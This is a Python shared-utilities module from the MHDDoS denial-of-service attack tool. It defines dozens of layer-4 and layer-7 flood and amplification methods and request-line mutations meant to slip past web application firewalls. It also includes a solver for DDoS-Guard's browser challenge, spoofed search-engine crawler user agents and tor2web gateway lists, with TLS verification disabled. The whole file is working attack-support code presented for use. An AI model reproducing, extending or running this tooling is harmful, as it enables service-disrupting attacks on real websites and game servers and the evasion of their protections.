#!/usr/bin/env python3
"""
Shared utilities extracted from start.py/gui.py.
bcolors, Methods, Tools, Counter, Minecraft, global state, config.
"""

from __future__ import annotations
import ssl
from base64 import b64encode
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import suppress
from itertools import cycle
from json import load
from logging import basicConfig, getLogger, shutdown
from math import log2, trunc
from multiprocessing import RawValue
from os import urandom as randbytes
from pathlib import Path
from random import choice as randchoice, randint
from re import compile
from socket import (
    AF_INET,
    IP_HDRINCL,
    IPPROTO_IP,
    IPPROTO_TCP,
    IPPROTO_UDP,
    SOCK_DGRAM,
    SOCK_RAW,
    SOCK_STREAM,
    TCP_NODELAY,
    gethostbyname,
    gethostname,
    socket,
)
from struct import pack as data_pack
from subprocess import run, PIPE
from sys import argv
from sys import exit as _exit
from threading import Event, Thread
from time import sleep, time
from typing import Any, List, Set, Tuple
from urllib import parse
from uuid import UUID, uuid4

from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
from PyRoxy import Tools as ProxyTools
from certifi import where
from cloudscraper import create_scraper
from dns import resolver
from icmplib import ping
from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
from requests import Response, Session, exceptions, get, cookies
from yarl import URL
import threading

basicConfig(format="[%(asctime)s - %(levelname)s] %(message)s", datefmt="%H:%M:%S")
logger = getLogger("MHDDoS")
logger.setLevel("INFO")
ctx: ssl.SSLContext = ssl.create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
if hasattr(ctx, "minimum_version") and hasattr(ssl, "TLSVersion"):
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
if hasattr(ssl, "OP_NO_TLSv1"):
    ctx.options |= ssl.OP_NO_TLSv1
if hasattr(ssl, "OP_NO_TLSv1_1"):
    ctx.options |= ssl.OP_NO_TLSv1_1

__version__: str = "3.0 REFACTOR"
__dir__: Path = Path(__file__).parent.parent
__ip__: Any = None

tor2webs = [
    "onion.city",
    "onion.cab",
    "onion.direct",
    "onion.sh",
    "onion.link",
    "onion.ws",
    "onion.pet",
    "onion.rip",
    "onion.plus",
    "onion.top",
    "onion.si",
    "onion.ly",
    "onion.my",
    "onion.sh",
    "onion.lu",
    "onion.casa",
    "onion.com.de",
    "onion.foundation",
    "onion.rodeo",
    "onion.lat",
    "tor2web.org",
    "tor2web.fi",
    "tor2web.blutmagie.de",
    "tor2web.to",
    "tor2web.io",
    "tor2web.in",
    "tor2web.it",
    "tor2web.xyz",
    "tor2web.su",
    "darknet.to",
    "s1.tor-gateways.de",
    "s2.tor-gateways.de",
    "s3.tor-gateways.de",
    "s4.tor-gateways.de",
    "s5.tor-gateways.de",
]

with open(__dir__ / "config.json") as f:
    con = load(f)

with socket(AF_INET, SOCK_DGRAM) as s:
    s.connect(("8.8.8.8", 80))
    __ip__ = s.getsockname()[0]


class bcolors:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKCYAN = "\033[96m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    RESET = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"


def exit(*message):
    if message:
        logger.error(bcolors.FAIL + " ".join(message) + bcolors.RESET)
    shutdown()
    _exit(1)


class Methods:
    LAYER7_METHODS: Set[str] = {
        "CFB",
        "BYPASS",
        "GET",
        "POST",
        "OVH",
        "STRESS",
        "DYN",
        "SLOW",
        "SLOWLORIS",
        "HEAD",
        "NULL",
        "COOKIE",
        "PPS",
        "EVEN",
        "GSB",
        "DGB",
        "AVB",
        "CFBUAM",
        "APACHE",
        "XMLRPC",
        "XMLRPC_MULTI",
        "BOT",
        "BOMB",
        "DOWNLOADER",
        "KILLER",
        "TOR",
        "RHEX",
        "STOMP",
        "WORDPRESS",
        "H2",
        "H2_RST",
        "COOKIE_HARVEST",
        "WS",
        "GQL",
        "H2_PRIORITY",
        "RANGE_CRASH",
        "STEALTH",
        "MIX",
        "RAPID",
        "QUIC",
        "TLS_FLOOD",
        "H2_CONT",
        "IMPERSONATE",
        "MEGA",
        "ASYNC",
    }

    LAYER4_AMP: Set[str] = {"MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP"}

    LAYER4_METHODS: Set[str] = {
        *LAYER4_AMP,
        "TCP",
        "UDP",
        "SYN",
        "VSE",
        "MINECRAFT",
        "MCBOT",
        "CONNECTION",
        "CPS",
        "FIVEM",
        "FIVEM-TOKEN",
        "TS3",
        "MCPE",
        "ICMP",
        "OVH-UDP",
    }

    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}


search_engine_agents = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/103.0.5060.134 Safari/537.36",
    "Googlebot-Image/1.0",
    "Googlebot-Video/1.0",
    "Googlebot-News",
    "AdsBot-Google (+http://www.google.com/adsbot.html)",
    "AdsBot-Google-Mobile-Apps",
    "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html)",
    "Mediapartners-Google",
    "FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "BingPreview/1.0b",
    "AdIdxBot/2.0 (+http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Yahoo! Slurp China",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "YandexMobileBot/3.0 (+http://yandex.com/bots)",
    "YandexImages/3.0",
    "YandexVideo/3.0",
    "YandexNews/3.0",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Baiduspider-image",
    "Baiduspider-video",
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
    "DuckDuckBot/2.0; (+http://duckduckgo.com/duckduckbot.html)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Facebot/1.0",
    "Twitterbot/1.0",
    "LinkedInBot/1.0 (+https://www.linkedin.com/)",
    "Pinterest/0.2 (+http://www.pinterest.com/bot.html)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "SemrushBot/7~bl (+http://www.semrush.com/bot.html)",
    "MJ12bot/v1.4.8 (http://mj12bot.com/)",
    "Sogou web spider/4.0 (+http://www.sogou.com/docs/help/webmasters.htm#07)",
    "Exabot/3.0 (+http://www.exabot.com/go/robot)",
    "SeznamBot/3.2 (http://napoveda.seznam.cz/seznambot-intro/)",
    "CCBot/2.0 (+http://commoncrawl.org/faq/)",
    "DotBot/1.1 (+http://www.opensiteexplorer.org/dotbot, help@moz.com)",
]

# --- WAF Bypass Vectors ---
WAF_BYPASS_VECTORS = [
    ("standard", "HTTP/1.1", None),
    ("tab_sep", "HTTP/1.1", lambda rl: rl.replace(" ", "\t")),
    ("double_space", "HTTP/1.1", lambda rl: rl.replace(" ", "  ")),
    (
        "absolute_uri",
        "HTTP/1.1",
        lambda rl, host, path: f"{rl.split()[0]} https://{host}{path} HTTP/1.1",
    ),
    ("http10", "HTTP/1.0", None),
    ("lowercase", "http/1.1", None),
    (
        "null_byte",
        "HTTP/1.1",
        lambda rl, path: rl.replace(
            path, path[: len(path) // 2] + "%00" + path[len(path) // 2 :]
        ),
    ),
    ("no_version", "", lambda rl: rl.split()[0] + " " + rl.split()[1]),
]

_waf_bypass_stats = {v[0]: {"success": 0, "fail": 0} for v in WAF_BYPASS_VECTORS}
_waf_bypass_lock = threading.Lock()


def waf_auto_select_bypass(method: str, host: str, path: str) -> str:
    with _waf_bypass_lock:
        best = max(
            _waf_bypass_stats.items(),
            key=lambda kv: kv[1]["success"] / max(kv[1]["fail"], 1),
        )
        vector_name = best[0]
    vector = next(v for v in WAF_BYPASS_VECTORS if v[0] == vector_name)
    rl = f"{method} {path} {vector[1]}".strip()
    modifier = vector[2]
    if modifier:
        try:
            rl = modifier(rl, host, path)
        except TypeError:
            rl = modifier(rl)
    return rl + "\r\n"


def waf_report_result(vector_name: str, success: bool):
    with _waf_bypass_lock:
        if success:
            _waf_bypass_stats[vector_name]["success"] += 1
        else:
            _waf_bypass_stats[vector_name]["fail"] += 1


# --- Traffic Graph ---
class TrafficGraph:
    def __init__(self, max_points=30):
        self._points = []
        self._max_points = max_points
        self._lock = threading.Lock()

    def add(self, pps: int):
        with self._lock:
            self._points.append(pps)
            if len(self._points) > self._max_points:
                self._points.pop(0)

    def render(self) -> str:
        with self._lock:
            if not self._points:
                return "[no data]"
            pts = list(self._points)
        max_val = max(pts) or 1
        height = 8
        rows = []
        for h in range(height, 0, -1):
            threshold = max_val * h / height
            line = ""
            for v in pts:
                line += "█" if v >= threshold else " "
            rows.append(f"{int(threshold):>8} |{line}")
        footer = f"{'':>8} +{'-' * len(pts)}"
        return "\n".join(rows) + "\n" + footer


_traffic_graph = TrafficGraph()


# --- Counter ---
class Counter:
    def __init__(self, value=0):
        self._value = RawValue("Q", value)

    def __iadd__(self, value):
        self._value.value += value
        return self

    def __int__(self):
        return self._value.value

    def set(self, value):
        self._value.value = value
        return self


REQUESTS_SENT = Counter()
BYTES_SEND = Counter()


class Tools:
    IP = compile("(?:\\d{1,3}\\.){3}\\d{1,3}")
    protocolRex = compile('"protocol":(\\d+)')

    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        MULTIPLES = [
            "B",
            "k{}B",
            "M{}B",
            "G{}B",
            "T{}B",
            "P{}B",
            "E{}B",
            "Z{}B",
            "Y{}B",
        ]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        return "-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2):
        suffixes = ["", "k", "m", "g", "t", "p"]
        if num > 999:
            obje = sum([abs(num / 1000.0**x) >= 1 for x in range(1, len(suffixes))])
            return f"{num / 1000.0**obje:.{precision}f}{suffixes[obje]}"
        return num

    @staticmethod
    def sizeOfRequest(res: Response) -> int:
        size = len(res.request.method)
        size += len(res.request.url)
        size += len(
            "\r\n".join(f"{key}: {value}" for key, value in res.request.headers.items())
        )
        return size

    @staticmethod
    def send(sock: socket, packet: bytes):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.send(packet):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def sendto(sock, packet, target):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.sendto(packet, target):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def dgb_solver(url, ua, pro=None):
        s = Session()
        if pro:
            s.proxies = pro
        try:
            hdrs = {
                "User-Agent": ua,
                "Accept": "text/html",
                "Accept-Language": "en-US",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "TE": "trailers",
                "DNT": "1",
            }
            ss = s.get(url, headers=hdrs)
            for key, value in ss.cookies.items():
                s.cookies.set_cookie(cookies.create_cookie(key, value))
            hdrs = {
                "User-Agent": ua,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site",
            }
            ss = s.post("https://check.ddos-guard.net/check.js", headers=hdrs)
            idss = None
            for key, value in ss.cookies.items():
                if key == "__ddg2":
                    idss = value
                s.cookies.set_cookie(cookies.create_cookie(key, value))
            hdrs = {
                "User-Agent": ua,
                "Accept": "image/webp,*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "no-cache",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site",
            }
            ss = s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs)
            for key, value in ss.cookies.items():
                s.cookies.set_cookie(cookies.create_cookie(key, value))
        except Exception:
            pass
        return s

    @staticmethod
    def safe_close(sock=None):
        if sock:
            sock.close()


class Minecraft:
    @staticmethod
    def varint(d: int) -> bytes:
        o = b""
        while True:
            b = d & 0x7F
            d >>= 7
            o += data_pack("B", b | (0x80 if d > 0 else 0))
            if d == 0:
                break
        return o

    @staticmethod
    def data(*payload: bytes) -> bytes:
        payload = b"".join(payload)
        return Minecraft.varint(len(payload)) + payload

    @staticmethod
    def short(integer: int) -> bytes:
        return data_pack(">H", integer)

    @staticmethod
    def long(integer: int) -> bytes:
        return data_pack(">q", integer)

    @staticmethod
    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
        return Minecraft.data(
            Minecraft.varint(0x00),
            Minecraft.varint(version),
            Minecraft.data(target[0].encode()),
            Minecraft.short(target[1]),
            Minecraft.varint(state),
        )

    @staticmethod
    def handshake_forwarded(
        target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID
    ) -> bytes:
        return Minecraft.data(
            Minecraft.varint(0x00),
            Minecraft.varint(version),
            Minecraft.data(
                target[0].encode(), b"\x00", ip.encode(), b"\x00", uuid.hex.encode()
            ),
            Minecraft.short(target[1]),
            Minecraft.varint(state),
        )

    @staticmethod
    def login(protocol: int, username: str) -> bytes:
        if isinstance(username, str):
            username = username.encode()
        return Minecraft.data(
            Minecraft.varint(
                0x00 if protocol >= 391 else 0x01 if protocol >= 385 else 0x00
            ),
            Minecraft.data(username),
        )

    @staticmethod
    def keepalive(protocol: int, num_id: int) -> bytes:
        return Minecraft.data(
            Minecraft.varint(
                0x0F
                if protocol >= 755
                else 0x10
                if protocol >= 712
                else 0x0F
                if protocol >= 471
                else 0x10
                if protocol >= 464
                else 0x0E
                if protocol >= 389
                else 0x0C
                if protocol >= 386
                else 0x0B
                if protocol >= 345
                else 0x0A
                if protocol >= 343
                else 0x0B
                if protocol >= 336
                else 0x0C
                if protocol >= 318
                else 0x0B
                if protocol >= 107
                else 0x00,
            ),
            Minecraft.long(num_id) if protocol >= 339 else Minecraft.varint(num_id),
        )

    @staticmethod
    def chat(protocol: int, message: str) -> bytes:
        return Minecraft.data(
            Minecraft.varint(
                0x03
                if protocol >= 755
                else 0x03
                if protocol >= 464
                else 0x02
                if protocol >= 389
                else 0x01
                if protocol >= 343
                else 0x02
                if protocol >= 336
                else 0x03
                if protocol >= 318
                else 0x02
                if protocol >= 107
                else 0x01,
            ),
            Minecraft.data(message.encode()),
        )
